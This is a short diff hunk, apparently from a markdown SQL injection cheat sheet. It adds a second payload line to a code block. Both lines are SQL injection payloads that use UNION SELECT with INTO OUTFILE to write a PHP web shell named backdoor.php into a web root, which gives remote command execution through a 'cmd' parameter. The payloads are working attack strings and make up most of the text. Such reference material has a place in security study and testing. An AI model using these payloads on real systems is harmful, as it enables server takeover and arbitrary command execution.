@@ -67,5 +67,6 @@ and webserver are on the same host and the database has permission to write to
 the web root!
 
 ```mysql
+' UNION ALL SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "/opt/lampp/htdocs/backdoor.php";--
 ' UNION ALL SELECT (SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "/opt/lampp/htdocs/backdoor.php"),NULL;--
 ```
